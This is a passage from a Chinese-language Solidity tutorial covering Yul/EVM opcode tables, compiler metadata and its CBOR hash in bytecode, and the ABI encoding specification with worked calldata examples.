- `C`: Constantinople
- `I`: Istanbul
- `L`: London

常见的常量值是 `0x20` / `0x40` , 代表十进制的 32 和 64。



#### 数学计算

| 操作符号        | 返回值 | 版本 | 解释说明                                                |
| --------------- | ------ | ---- | ------------------------------------------------------- |
| add(x, y)       |        | F    | `x + y`                                                 |
| sub(x, y)       |        | F    | `x - y`                                                 |
| mul(x, y)       |        | F    | `x * y`                                                 |
| div(x, y)       |        | F    | `x / y` (如果 y 为 0，则结果为 0)                       |
| mod(x, y)       |        | F    | `x % y` (如果 y 为 0，则结果为 0)                       |
| exp(x, y)       |        | F    | `x` 的 `y` 次方                                         |
| addmod(x, y, m) |        | F    | `(x + y) % m` 任意精度算术，如果 m == 0 则为 0          |
| mulmod(x, y, m) |        | F    | `(x * y) % m` 任意精度算术，如果 m == 0 则为 0          |
| sdiv(x, y)      |        | F    | `x / y`, 以二进制补码作为符号 (如果 y 为 0，则结果为 0) |
| smod(x, y)      |        | F    | `x % y`, 以二进制补码作为符号 (如果 y 为 0，则结果为 0) |





#### 比较关系

| 操作符号  | 返回值 | 版本 | 解释说明                                      |
| --------- | ------ | ---- | --------------------------------------------- |
| gt(x,y)   |        | F    | 如果x>y，等于1，否则为0                       |
| lt(x,y)   |        | F    | 如果x<y，等于1，否则为0                       |
| eq(x,y)   |        | F    | 如果x==y，等于1，否则为0                      |
| iszero(x) |        | F    | 如果x==0，等于1，否则为0                      |
| slt(x,y)  |        | F    | 如果x<y，等于1，否则为0，以二进制补码作为符号 |
| sgt(x,y)  |        | F    | 如果x>y，等于1，否则为0，以二进制补码作为符号 |







#### 按位和移位



| 操作符号  | 返回值 | 版本 | 解释说明                            |
| --------- | ------ | ---- | ----------------------------------- |
| not(x)    |        | F    | 对 x 按位取反,类似`~x`;`x` 的按位非 |
| and(x, y) |        | F    | x 和 y 的按位与                     |
| or(x, y)  |        | F    | x 和 y 的按位或                     |
| xor(x, y) |        | F    | x 和 y 的按位异或                   |
| shl(x, y) |        | C    | y 逻辑左移 x 位                     |
| shr(x, y) |        | C    | y 逻辑右移 x 位                     |
| sar(x, y) |        | C    | 将 y 算术右移 x 位                  |





#### EVM区块交易相关

| 操作符号       | 返回值 | 版本 | 解释说明                                                     |
| -------------- | ------ | ---- | ------------------------------------------------------------ |
| address()      |        | F    | 当前合约地址 / execution context                             |
| balance(a)     |        | F    | 地址 a 的 wei 余额                                           |
| selfbalance()  |        | I    | 相当于 `balance(address())`，但更便宜                        |
| extcodehash(a) |        | C    | 地址 a 的代码哈希                                            |
|                |        |      |                                                              |
| **msg 相关**   |        |      |                                                              |
| caller()       |        | F    | call sender ( 类似`msg.sender`？) (excluding `delegatecall`) |
| callvalue()    |        | F    | wei sent together with the current call（类似`msg.value`？） |
|                |        |      |                                                              |
| **block 相关** |        |      |                                                              |
| chainid()      |        | I    | 当前网络的链 ID (EIP-1344)                                   |
| basefee()      |        | L    | 当前区块的基本费用 (EIP-3198 and EIP-1559)                   |
| timestamp()    |        | F    | 当前块的时间戳，自纪元以来的秒数                             |
| coinbase()     |        | F    | 当前采矿受益人                                               |
| number()       |        | F    | 当前区块号                                                   |
| difficulty()   |        | F    | 当前区块的难度                                               |
| gaslimit()     |        | F    | 当前区块的区块 gas limit                                     |
|                |        |      |                                                              |
| **tx 相关**    |        |      |                                                              |
| origin()       |        | F    | 交易发送方                                                   |
| gasprice()     |        | F    | 交易的 gas 价格                                              |
|                |        |      |                                                              |
| **其它**       |        |      |                                                              |
| gas()          |        | F    | 剩余 gas                                                     |
| blockhash(b)   |        | F    | 指定 block 的 hash - 仅适用于最后 256 个块，不包括当前块     |





#### 常见方法

| 操作符号            | 返回值 | 版本 | 解释说明                              |
| ------------------- | ------ | ---- | ------------------------------------- |
| sload(p)            |        | F    | `storage[p]`                          |
| mload(p)            |        | F    | `mem[p…(p+32))`                       |
| sstore(p, v)        | -      | F    | `storage[p] := v`                     |
| mstore(p, v)        | -      | F    | `mem[p…(p+32)) := v`                  |
| mstore8(p, v)       | -      | F    | `mem[p] := v` & 0xff (只修改单个字节) |
| keccak256(p, n)     |        | F    | `keccak(mem[p…(p+n)))`                |
| create(v, p, n)     |        | F    | create 创建合约                       |
| create2(v, p, n, s) |        | C    | create2 创建合约                      |

小例子:

- `mload(p)`: 分配数据
- `mstore(offset, value)`: 在 `offset` 的位置储存 `value`







#### 操作数据/大小

| 操作符号                | 返回值 | 版本 | 解释说明                                                     |
| ----------------------- | ------ | ---- | ------------------------------------------------------------ |
| msize()                 |        | F    | 内存大小，即最大访问内存索引                                 |
| pc()                    |        | F    | 当前在代码中的位置                                           |
| codesize()              |        | F    | 当前合约的代码大小 / execution context                       |
| codecopy(t, f, s)       | -      | F    | 从位置 f 的代码复制 s 个字节到位置 t 的内存                  |
| extcodesize(a)          |        | F    | 获取地址 a 的代码大小                                        |
| extcodecopy(a, t, f, s) | -      | F    | 像 codecopy(t, f, s) 但在地址 a 处获取代码                   |
| signextend(i, x)        |        | F    | sign extend from `(i*8+7)`th bit counting from least significant |
| byte(n, x)              |        | F    | x 的第 n 个字节，这个索引是从 0 开始的                       |
| pop(x)                  | -      | F    | 丢弃值 x                                                     |







#### call相关

| 操作符号                                     | 返回值 | 版本 | 解释说明                                                     |
| -------------------------------------------- | ------ | ---- | ------------------------------------------------------------ |
| calldataload(p)                              |        | F    | 从位置 p 开始调用数据 (32 bytes)                             |
| calldatasize()                               |        | F    | 调用数据的大小（以字节为单位）                               |
| calldatacopy(t, f, s)                        |        | F    | 从位置 f 的 calldata 复制 s 个字节到位置 t 的内存            |
| call(g, a, v, in, insize, out, outsize)      |        | F    | 在地址 a 调用合约 [See more](https://www.axihe.com/#yul-call-return-area) |
| callcode(g, a, v, in, insize, out, outsize)  |        | F    | 与 `call` 相同，但仅使用 a 中的代码，否则留在当前合约的上下文中 [See more](https://www.axihe.com/#yul-call-return-area) |
| delegatecall(g, a, in, insize, out, outsize) |        | H    | 与 `callcode` 相同，但也保留 `caller` 和 `callvalue` [See more](https://www.axihe.com/#yul-call-return-area) |
| staticcall(g, a, in, insize, out, outsize)   |        | B    | 与 `call(g, a, 0, in, insize, out, outsize)` 相同，但不允许状态修改 ons [See more](https://www.axihe.com/#yul-call-return-area) |





#### 结束执行

| 操作符号                | 返回值 | 版本 | 解释说明                                                 |
| ----------------------- | ------ | ---- | -------------------------------------------------------- |
| return(p, s)            | -      | F    | 结束执行, return data mem[p…(p+s))                       |
| stop()                  | -      | F    | 结束执行, 类似 `return(0, 0)`                            |
| revert(p, s)            | -      | B    | 结束执行, revert state changes, return data mem[p…(p+s)) |
| selfdestruct(a)         | -      | F    | 结束执行, destroy current contract and send funds to a   |
| invalid()               | -      | F    | 结束执行 with invalid instruction                        |
| returndatasize()        |        | B    | 最后返回数据的大小                                       |
| returndatacopy(t, f, s) | -      | B    | 将 s 个字节从位置 f 的 returndata 复制到位置 t 的 mem    |





#### log信息

| 操作符号                   | 返回值 | 版本 | 解释说明                                             |
| -------------------------- | ------ | ---- | ---------------------------------------------------- |
| log0(p, s)                 |        | F    | log without topics and data mem[p…(p+s))             |
| log1(p, s, t1)             |        | F    | log with topic t1 and data mem[p…(p+s))              |
| log2(p, s, t1, t2)         |        | F    | log with topics t1, t2 and data mem[p…(p+s))         |
| log3(p, s, t1, t2, t3)     |        | F    | log with topics t1, t2, t3 and data mem[p…(p+s))     |
| log4(p, s, t1, t2, t3, t4) |        | F    | log with topics t1, t2, t3, t4 and data mem[p…(p+s)) |









## metadata元数据

solidity编译器在编译时会自动生成`xx_metadata.json`的**JSON文件，中文叫合约的元数据，其中包含了当前合约的相关信息**。





### metadata包含信息

```json
{
    //必须：元素据格式的版本（注意和solidity版本不是同一个version）
    "version":"1",
    
    // 必选：源代码的编程语言，一般会选择规范的“子版本”
    "language":"Solidity",
    
    // 必选：编译器的细节，内容视语言而定。
    "compiler":{
        // 对 Solidity 来说是必须的：编译器的版本
        "version":"0.8.7+commit.e28d00a7",
        
        // 可选： 生成此输出的编译器二进制文件的哈希值
        "keccak256":"0x123..."
    },
    
    //必选：合约的生成信息
    "output":{
        // 必选：合约的 ABI 定义
    	"abi": [ /*...*/],
    	// 必选：合约的 NatSpec 用户文档
    	"userdoc": [ /*...*/],
    	// 必选：合约的 NatSpec 开发者文档
    	"devdoc": [ /*...*/],
    },
    
    //必选：编译器的设置
    "settings":{
        "compilationTarget":{
            "a.sol":"Sum"
        },
        "evmVersion":"london",
        "libraries":{},
        "metadata":{
          // Reflects the setting used in the input json, defaults to false
     	 "useLiteralContent": true,
      	 // Reflects the setting used in the input json, defaults to "ipfs"
      	 "bytecodeHash": "ipfs"
        },
        
        // 可选： 优化器的设置（ enabled 默认设为 false ）
   		"optimizer": {
      	"enabled": true,
      	"runs": 200
    	},
    	// 对 Solidity 来说是必须的： 已排序的重定向列表
    	"remappings": [":g/dir"],
  	},
    
    //必选：编译的源文件/源单位，键值为文件名
    "sources":{
        "myFile.sol":{
             // 必选：源文件的 keccak256 哈希值
            "keccake256":"0x123...",
            // Optional: 在源文件中定义的 SPDX license 标识
            "license":"MIT",
            // 必选（除非定义了 content，详见下文）：
      		// 已排序的源文件的URL，URL的协议可以是任意的，但建议使用 Swarm 的URL
            "urls":[
                "bzz-raw://fd33d",
                "dwed:/ifpfs/Qme8Vrt"
            ]
        },
        
         // 可选
        "mortal":{
             // 必选：源文件的 keccak256 哈希值
            "keccak256":"0x234...",
            // 必选（除非定义了“urls”）： 源文件的字面内容
            "content":"contract mortal is owned {function kill(){if (msg.sender==owner) 							selfdestruct(owner);}}"
        }
    },
}
```



**metadata的作用：**

**==metadata主要是为了更安全与合约进行交互并验证其源代码。==**

+ 查询编译器版本
+ 所使用的源代码
+ ABI
+ natspec文档

编译器会将元数据文件的Swarm哈希值附加到每个合约的字节码末尾，以便可以以认证的方式获取该文件，而不必求助于中心化的数据提供者。当然，你必须将元数据文件发到Swarm（或其他服务），以便其他人可以访问它。该文件可以通过使用`solc-metadata`来生成，并命名为`ContractName_meta.json`。它将包含源代码的在Swarm上的引用，因此必须上传所有的源文件和元数据文件。

⚠️ 警告: 由于生成的合约的字节码包含元数据的哈希值，因此对元数据的任何更改都会导致字节码的更改。
此外，由于元数据包含所有使用的源代码的哈希值，所以任何源代码中的，哪怕是一个空格的变化都将导致不同的元数据，并随后产生不同的字节代码。

⚠️ 警告: 需注意，上面的 ABI 没有固定的顺序，随编译器的版本而不同。





### 字节码中元素据哈希的编码

由于在将来可能会支持其他方式来获取元数据文件， 类似`{"bzzr0"：<Swarm hash>}` 的键值对，将会以
CBOR (https://tools.ietf.org/html/rfc7049) 编码来存储。由于这种编码的起始位不容易找到，因此添加两个字节来表述其长度，以大端方式编码。所以，当前版本的 Solidity 编译器，将以下内容添加到部署的字节码的末尾

```solidity
    0xa2
    0x64 'i' 'p' 'f' 's' 0x58 0x22 <34 bytes IPFS hash>
    0x64 's' 'o' 'l' 'c' 0x43 <3 byte version encoding>
    0x00 0x33
```

因此，为了检索数据，可以检查已部署字节码的末尾以匹配该模式，并使用 IPFS 哈希来检索文件。

solc 的发布版本使用如上所示的版本的 3 字节编码（major, minor and patch version number 版本号各一个字节），而预发布版本将使用完整的版本字符串，包括提交哈希和构建日期。

CBOR 映射还可以包含其他密钥，因此最好完全解码数据而不是依赖以 `0xa264` 开头的数据。 例如，如果使用任何影响代码生成的实验性功能，则映射也将包含 `"experimental"：true`。

编译器目前默认使用元数据的 IPFS 哈希，但将来也可能使用 bzzr1 哈希或其他一些哈希，因此不要依赖此序列以 `0xa2 0x64 'i' 'p' 'f' 's'` 开头 的。 我们可能还会向此 CBOR 结构中添加其他数据，因此最好的选择是使用适当的 CBOR 解析器。







### 自动化接口生成和natspec使用

元数据以下列方式使用：通过钱包想要与合约交互时检索合约代码，然后检索文件的 IPFS/Swarm 哈希。该文件被 JSON 解码为上面的结构。

组件可以使用 ABI 自动为合约生成一个基本的用户界面。

此外，钱包可以使用 NatSpec 用户文档，在用户与合约交互，授权请求签名时候做辅助工作。



### 源代码如何验证？

为了验证编译，可以通过元数据文件中的链接从 IPFS/Swarm 中获取源代码。获取到的源码，会根据元数据中指定的设置，被正确版本的编译器所处理。处理得到的字节码会与创建交易的数据或者 `CREATE` 操作码使用的数据进行比较。这会自动验证元数据，因为它的哈希值是字节码的一部分。而额外的数据，则是与基于接口进行编码并展示给用户的构造输入数据相符的。

在 [sourcify](https://github.com/ethereum/sourcify) 库([npm package](https://www.npmjs.com/package/source-verify))可以看到如何使用该特性的示例代码。











## ABI编码

ABI是应用二进制接口，**ABI是区块链外部与合约进行交互以及合约与合约之间进行交互的一种标准方式**。数据会根据其类型进行编码。需要一种特定的概要（schema）来进行解码。



对于一些没有开源的代码，我们可以通过区块链上传入的参数，来反推数据结构，根据方法的结果，来反推内部实现逻辑。经常听到一些没有开源的合约被盗，基本就是被别人通过 ABI 编码反推来寻找漏洞的。







### ABI类型编码

#### 基础类型

+ `uint<M>`：`M` 位的无符号整数， `0 < M <= 256`、`M % 8 == 0`。例如： `uint32`， `uint8`， `uint256`。
+ `int<M>`：以 2 的补码作为符号的 `M` 位整数， `0 < M <= 256`、`M % 8 == 0`。
+ `address`：除了字面上的意思和语言类型的区别以外，等价于`uint160`。在计算和 函数选择器(function selector) 中，通常使用 `address`。
+ `uint`、 `int`： `uint256`、 `int256` 各自的同义词。在计算和函数选择器(function selector) 中，通常使用 `uint256` 和 `int256`。
+ `bool`：等价于 `uint8`，取值限定为 0 或 1 。在计算和函数选择器(function selector) 中，通常使用 `bool`。
+ `fixed<M>x<N>`： `M` 位的有符号的固定小数位的十进制数字`8<= M <=256`、 `M%8 == 0`、且 `0 < N <= 80`。其值 `v` 即是`v /(10 ** N)`。
+ `ufixed<M>x<N>`：无符号的 `fixed<M>x<N>`。、
+ `fixed`、 `ufixed`： `fixed128x18`、 `ufixed128x18`各自的同义词。在计算和 函数选择器(function selector) 中，通常使用`fixed128x18` 和 `ufixed128x18`。
+ `bytes<M>`： `M` 字节的二进制类型， `0 < M <= 32`。
+ `function`：一个地址（20 字节）之后紧跟一个 函数选择器(function selector)（4 字节）。编码之后等价于 `bytes24`。











#### 定长数组类型

- `<type>[M]`：有`M`个元素的定长数组，`M >= 0`，数组元素为给定类型。
  - ⚠️：尽管此 ABI 规范可以表示零个元素的定长数组，但编译器不支持它们。









#### 非定长数组类型

+ `bytes`：动态大小的字节序列。
+ `string`：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。
+ `<type>[]`：元素为给定类型的变长数组。
  + 可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组(tuple)：
+ `(T1,T2,...,Tn)`：由 `T1`，…， `Tn`， `n >= 0` 构成的 元组(tuple)。



用元组(tuple) 构成 元组(tuple)、用 元组(tuple)构成数组等等也是可能的。另外也可以构成"零元组（zero-tuples）"，就是
`n = 0` 的情况。







#### 不支持ABI的solidity类型

Solidity 支持上面介绍的所有同名称的类型，除元组外。 另一方面，一些 Solidity 类型不被 ABI 支持。下表在左栏显示了不支持 ABI 的 Solidity 类型，以及在右栏显示可以代表它们的 ABI 类型。



| Solidity                 | ABI                       |
| ------------------------ | ------------------------- |
| address payable          | `address`                 |
| contract                 | `address`                 |
| enum                     | `uint8`                   |
| user defined value types | its underlying value type |
| struct                   | `tuple`                   |







### ABI编码的设计原则

我们现在来正式讲述编码，它具有如下属性，如果参数是嵌套的数组，这些属性非常有用：

1. 读取的次数取决于参数数组结构中的最大深度；也就是说，要取得`a_i[k][l][r]` 需要读取 4 次。
2. 变量或数组元素的数据不与其他数据交错，并且它是可以再定位的。它们只会使用相对的"地址"。





### 编码的形式化说明

我们需要区分静态和动态类型。静态类型会被直接编码，动态类型则会在当前数据块之后单独分配的位置被编码。

**定义：** 以下类型被称为"动态"：

- `bytes`
- `string`
- 任意类型 `T` 的变长数组 `T[]`
- 任意动态类型 `T` 的定长数组 `T[k]` （ `k >= 0`）
- 由动态的 `Ti` （ `1 <= i <= k`）构成的 元组(tuple) `(T1,...,Tk)`

所有其他类型都被称为"静态"。

**定义：** `len(a)` 是一个二进制字符串 `a` 的字节长度。 `len(a)`
的类型被呈现为 `uint256`。

我们把实际的编码 `enc`
定义为一个由 ABI 类型到二进制字符串的值的映射；因而，当且仅当 `X`
的类型是动态的， `len(enc(X))` （即 `X`
经编码后的实际长度，译者注）才会依赖于 `X` 的值。

**定义：** 对任意 ABI 值 `X`，我们根据 `X` 的实际类型递归地定义 `enc(X)`。

- `(T1,...,Tk)` 对于 `k >= 0` 且任意类型 `T1` ,…, `Tk`

  `enc(X) = head(X(1)) ... head(X(k)) tail(X(1)) ... tail(X(k))`

  这里， `X = (X(1), ..., X(k))`，并且 当 `Ti` 为静态类型时， `head`
  和 `tail` 被定义为

  `head(X(i)) = enc(X(i))` and `tail(X(i)) = ""` （空字符串）

  否则，比如 `Ti` 是动态类型时，它们被定义为

  `head(X(i)) = enc(len(head(X(1)) ... head(X(k-1)) tail(X(1)) ... tail(X(i-1))))`
  `tail(X(i)) = enc(X(i))`

  **注意**，在动态类型的情况下，由于 head
  部分的长度仅取决于类型而非值，所以 `head(X(i))`
  是定义明确的。它的值是从 `enc(X)` 的开头算起的，`tail(X(i))`
  的起始位在 `enc(X)` 中的偏移量。

- `T[k]` 对于任意 `T` 和 `k`：

  `enc(X) = enc((X[0], ..., X[k-1]))`

  即是说，它就像是个由相同类型的 `k` 个元素组成的 元组(tuple)
  那样被编码的。

- `T[]` 当 `X` 有 `k` 个元素（ `k` 被呈现为类型 `uint256`）：

  `enc(X) = enc(k) enc([X[1], ..., X[k]])`

  即是说，它就像是个由静态大小 `k`
  的数组那样被编码的，且由元素的个数作为前缀。

- 具有 `k` （呈现为类型 `uint256`）长度的 `bytes`：

  `enc(X) = enc(k) pad_right(X)`，即是说，字节数被编码为
  `uint256`，紧跟着实际的 `X` 的字节码序列，再在高位（左侧）补上可以使
  `len(enc(X))` 成为 32 的倍数的最少数量的 0 值字节数据。

- `string`：

  `enc(X) = enc(enc_utf8(X))`，即是说， `X` 被 UFT-8
  编码，且在后续编码中将这个值解释为 `bytes`
  类型。

  **注意**，在随后的编码中使用的长度是其 UFT-8
  编码的字符串的字节数，而不是其字符数。

- `uint<M>`： `enc(X)` 是在 `X` 的大端序编码的高位（左侧）补充若干 0
  值字节以使其长度成为 32 字节。

- `address`：与 `uint160` 的情况相同。

- `int<M>`： `enc(X)` 是在 `X` 的大端序的 2
  的补码编码的高位（左侧）添加若干字节数据以使其长度成为 32
  字节；对于负数，添加值为 `0xff` （即 8 位全为
  1，译者注）的字节数据，对于非负数，添加 0 值（即 8 位全为
  0，译者注）字节数据。

- `bool`：与 `uint8` 的情况相同， `1` 用来表示 `true`， `0` 表示
  `false`。

- `fixed<M>x<N>`： `enc(X)` 就是 `enc(X * 10**N)`，其中 `X * 10**N`
  可以理解为 `int256`。

- `fixed`：与 `fixed128x18` 的情况相同。

- `ufixed<M>x<N>`： `enc(X)` 就是 `enc(X * 10**N)`，其中 `X * 10**N`
  可以理解为 `uint256`。

- `ufixed`：与 `ufixed128x18` 的情况相同。

- `bytes<M>`： `enc(X)` 就是 `X` 的字节序列加上为使长度成为 32
  字节而添加的若干 0 值字节。

注意，对于任意的 `X`， `len(enc(X))` 都是 32 的倍数。







### 函数选择器和参数编码

函数选择器(function selector)：以 `a_1, ..., a_n` 为参数的对 `f` 函数的调用，会被编码为`function_selector(f) enc((a_1, ..., a_n))`，`f` 的返回值 `v_1, ..., v_k` 会被编码为 `enc((v_1, ..., v_k))`，也就是说，返回值会被组合为一个 元组(tuple) 进行编码。





#### 函数选择器

这个在 [函数的签名](https://www.axihe.com/source/04.function.html#id19) 那里已经详细介绍过，之类做一个小总结。

一个函数调用数据的前 4 字节，指定了要调用的函数。**这就是某个函数签名的 Keccak 哈希的前 4 字节**（bytes32 类型是从左取值）。

函数签名被定义为基础原型的规范表达，而基础原型是**函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格。**.

⚠️ 注意: 函数的返回类型并不是函数签名的一部分。在 [Solidity 的函数重载](https://www.axihe.com/source/04.function.html#id21) 中，返回值并没有被考虑。这是为了使对函数调用的解析保持上下文无关。 然而 metadata 的描述中即包含了输入也包含了输出。（参考 [JSON ABI](https://www.axihe.com/source/17.metadata.html)）。





#### 参数编码

从第 5 字节开始是被编码的参数。这种编码方式也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的 4 个字节则不需要再进行编码。



**示例：**

给定一个合约：

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.16 <0.9.0;

contract Foo {
  function bar(bytes3[2]) public pure {}
  function baz(uint32 x, bool y) public pure returns (bool r) { r = x > 32 || y; }
  function sam(bytes, bool, uint[]) public pure {}
}
```



##### 调用baz

这样，对于我们的例子 `Foo`，如果我们想用 `69` 和 `true` 做参数调用 `baz`，我们总共需要传送 68 字节，可以分解为：

- `0xcdcd77c0`：方法 ID。这源自 ASCII 格式的 `baz(uint32,bool)` 签名的
  Keccak 哈希的前 4 字节。
- `0x0000000000000000000000000000000000000000000000000000000000000045`：第一个参数，一个被用
  0 值字节补充到 32 字节的 uint32 值 `69`。
- `0x0000000000000000000000000000000000000000000000000000000000000001`：第二个参数，一个被用
  0 值字节补充到 32 字节的 boolean 值 `true`。

合起来就是:

```solidity
0xcdcd77c0
0000000000000000000000000000000000000000000000000000000000000045
0000000000000000000000000000000000000000000000000000000000000001
```

它返回一个 `bool`。比如它返回 `false`，那么它的输出将是一个字节数组
`0x0000000000000000000000000000000000000000000000000000000000000000`，一个 bool 值。





##### 调用bar

如果我们想用 `["abc", "def"]` 做参数调用`bar`，我们总共需要传送 68 字节，可以分解为：

- `0xfce353f6`：方法 ID。源自 `bar(bytes3[2])` 的签名。
- `0x6162630000000000000000000000000000000000000000000000000000000000`：第一个参数的第一部分，一个`bytes3` 值 `"abc"` （左对齐）。
- `0x6465660000000000000000000000000000000000000000000000000000000000`：第一个参数的第二部分，一个 `bytes3` 值 `"def"` （左对齐）。

合起来就是:

```solidity
0xfce353f6
6162630000000000000000000000000000000000000000000000000000000000
6465660000000000000000000000000000000000000000000000000000000000
```





##### 调用sam

如果我们想用 `"dave"`、 `true` 和 `[1,2,3]` 作为参数调用`sam`，我们总共需要传送 292 字节，可以分解为：

- `0xa5643bf2`：方法 ID。源自 `sam(bytes,bool,uint256[])`的签名。注意， `uint` 被替换为了它的权威代表 `uint256`。
- `0x0000000000000000000000000000000000000000000000000000000000000060`：第一个参数（动态类型）的数据部分的位置，即从参数编码块开始位置算起的字节数。在这里，是 `0x60` 。
- `0x0000000000000000000000000000000000000000000000000000000000000001`：第二个参数：boolean 的 true。
- `0x00000000000000000000000000000000000000000000000000000000000000a0`：第三个参数（动态类型）的数据部分的位置，由字节数计量。在这里，是`0xa0`。
- `0x0000000000000000000000000000000000000000000000000000000000000004`：第一个参数的数据部分，以字节数组的元素个数作为开始，在这里，是 4。
- `0x6461766500000000000000000000000000000000000000000000000000000000`：第一个参数的内容 `"dave"` 的 UTF-8 编码（在这里等同于 ASCII 编码），并在右侧（低位）用 0 值字节补充到 32 字节。
- `0x0000000000000000000000000000000000000000000000000000000000000003`：第三个参数的数据部分，以数组的元素个数作为开始，在这里，是 3。
- `0x0000000000000000000000000000000000000000000000000000000000000001`：第三个参数的第一个数组元素。
- `0x0000000000000000000000000000000000000000000000000000000000000002`：第三个参数的第二个数组元素。
- `0x0000000000000000000000000000000000000000000000000000000000000003`：第三个参数的第三个数组元素。

合起来就是:

```
0xa5643bf2
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000001
00000000000000000000000000000000000000000000000000000000000000a0
0000000000000000000000000000000000000000000000000000000000000004
6461766500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000003
0000000000000000000000000000000000000000000000000000000000000001
0000000000000000000000000000000000000000000000000000000000000002
0000000000000000000000000000000000000000000000000000000000000003
```















### 动态类型的使用

#### 静态和动态混合

用参数 `(0x123, [0x456, 0x789], "1234567890", "Hello, world!")` 进行对函数 `f(uint,uint32[],bytes10,bytes)` 的调用会通过以下方式进行编码：

取得 `sha3("f(uint256,uint32[],bytes10,bytes)")` 的前 4 字节，也就是 `0x8be65246`。 然后我们对所有 4 个参数的头部进行编码。对静态类型 `uint256` 和 `bytes10` 是可以直接传过去的值；对于动态类型 `uint32[]` 和 `bytes`，**我们使用的字节数偏移量是它们的数据区域的起始位置，由需编码的值的开始位置算起**（也就是说，不计算包含了函数签名的前 4 字节），这就是：

**基础部分**：

- `0x8be65246`
- `0x0000000000000000000000000000000000000000000000000000000000000123` `0x123` 补充到 32 字节）
- `0x0000000000000000000000000000000000000000000000000000000000000080`（第二个参数的数据部分起始位置的偏移量，`4*32` 字节，正好是头部的大小）
- `0x3132333435363738393000000000000000000000000000000000000000000000`（`"1234567890"` 从右边补充到 32 字节）
- `0x00000000000000000000000000000000000000000000000000000000000000e0`（第四个参数的数据部分起始位置的偏移量 =
  第一个动态参数的数据部分起始位置的偏移量 + 第一个动态参数的数据部分的长度 = `4*32 + 3*32`，参考后文）

**动态部分**：

在此之后，跟着**第一个动态参数**的数据部分 `[0x456, 0x789]`：

- `0x0000000000000000000000000000000000000000000000000000000000000002`（数组元素个数，2）
- `0x0000000000000000000000000000000000000000000000000000000000000456`（第一个数组元素）
- `0x0000000000000000000000000000000000000000000000000000000000000789`（第二个数组元素）

最后，我们将**第二个动态参数**的数据部分 `"Hello, world!"` 进行编码：

- `0x000000000000000000000000000000000000000000000000000000000000000d`（元素个数，在这里是字节数：13）
- `0x48656c6c6f2c20776f726c642100000000000000000000000000000000000000`（ `"Hello, world!"` 从右边补充到 32 字节）

最后，合并到一起的编码就是（为了清晰，在 函数选择器(function selector) 和每 32 字节之后加了换行）：

```
0x8be65246
0000000000000000000000000000000000000000000000000000000000000123
0000000000000000000000000000000000000000000000000000000000000080
3132333435363738393000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000e0
0000000000000000000000000000000000000000000000000000000000000002
0000000000000000000000000000000000000000000000000000000000000456
0000000000000000000000000000000000000000000000000000000000000789
000000000000000000000000000000000000000000000000000000000000000d
48656c6c6f2c20776f726c642100000000000000000000000000000000000000
```









#### 纯动态参数

让我们使用相同的原理来对一个签名为 `g(uint[][],string[])`，参数值为`([[1, 2], [3]], ["one", "two", "three"])`的函数来进行编码；但从最原子的部分开始：

首先我们将第一个根数组 `[[1, 2], [3]]` 的第一个嵌入的动态数组 `[1, 2]`的长度和数据进行编码：

- `0x0000000000000000000000000000000000000000000000000000000000000002`(第一个数组中的元素数量 2；元素本身是 `1` 和 `2`)
- `0x0000000000000000000000000000000000000000000000000000000000000001`(第一个元素)
- `0x0000000000000000000000000000000000000000000000000000000000000002`(第二个元素)

然后我们将第一个根数组 `[[1, 2], [3]]` 的第二个潜入的动态数组 `[3]`的长度和数据进行编码：

- `0x0000000000000000000000000000000000000000000000000000000000000001`(第二个数组中的元素数量 1；元素数据是 `3`)
- `0x0000000000000000000000000000000000000000000000000000000000000003`(第一个元素)

然后我们需要找到动态数组 `[1, 2]` 和 `[3]`的偏移量。要计算这个偏移量，我们可以来看一下第一个根数组 `[[1, 2], [3]]`编码后的具体数据：

```
0 - a                                                                - [1, 2] 的偏移量
1 - b                                                                - [3] 的偏移量
2 - 0000000000000000000000000000000000000000000000000000000000000002 - [1, 2] 的计数
3 - 0000000000000000000000000000000000000000000000000000000000000001 - 1 的编码
4 - 0000000000000000000000000000000000000000000000000000000000000002 - 2 的编码
5 - 0000000000000000000000000000000000000000000000000000000000000001 - [3] 的计数
6 - 0000000000000000000000000000000000000000000000000000000000000003 - 3 的编码
```

偏移量 `a` 指向数组 `[1, 2]` 内容的开始位置，即第 2 行的开始（64 字节）；所以 `a = 0x0000000000000000000000000000000000000000000000000000000000000040`。

偏移量 `b` 指向数组 `[3]` 内容的开始位置，即第 5 行的开始（160 字节）；所以 `b = 0x00000000000000000000000000000000000000000000000000000000000000a0`。

然后我们对第二个根数组的嵌入字符串进行编码：

- `0x0000000000000000000000000000000000000000000000000000000000000003`(单词 `"one"` 中的字符个数)
- `0x6f6e650000000000000000000000000000000000000000000000000000000000`(单词 `"one"` 的 utf8 编码)
- `0x0000000000000000000000000000000000000000000000000000000000000003`(单词 `"two"` 中的字符个数)
- `0x74776f0000000000000000000000000000000000000000000000000000000000`(单词 `"two"` 的 utf8 编码)
- `0x0000000000000000000000000000000000000000000000000000000000000005`(单词 `"three"` 中的字符个数)
- `0x7468726565000000000000000000000000000000000000000000000000000000`(单词 `"three"` 的 utf8 编码)

作为与第一个根数组的并列，因为字符串也属于动态元素，我们也需要找到它们的偏移量 `c`, `d` 和 `e`：

```
0 - c                                                                - "one" 的偏移量
1 - d                                                                - "two" 的偏移量
2 - e                                                                - "three" 的偏移量
3 - 0000000000000000000000000000000000000000000000000000000000000003 - "one" 的字符计数
4 - 6f6e650000000000000000000000000000000000000000000000000000000000 - "one" 的编码
5 - 0000000000000000000000000000000000000000000000000000000000000003 - "two" 的字符计数
6 - 74776f0000000000000000000000000000000000000000000000000000000000 - "two" 的编码
7 - 0000000000000000000000000000000000000000000000000000000000000005 - "three" 的字符计数
8 - 7468726565000000000000000000000000000000000000000000000000000000 - "three" 的编码
```

偏移量 `c` 指向字符串 `"one"` 内容的开始位置，即第 3 行的开始（96 字节）；所以`c = 0x0000000000000000000000000000000000000000000000000000000000000060`。

偏移量 `d` 指向字符串 `"two"` 内容的开始位置，即第 5 行的开始（160 字节）；所以`d = 0x00000000000000000000000000000000000000000000000000000000000000a0`。

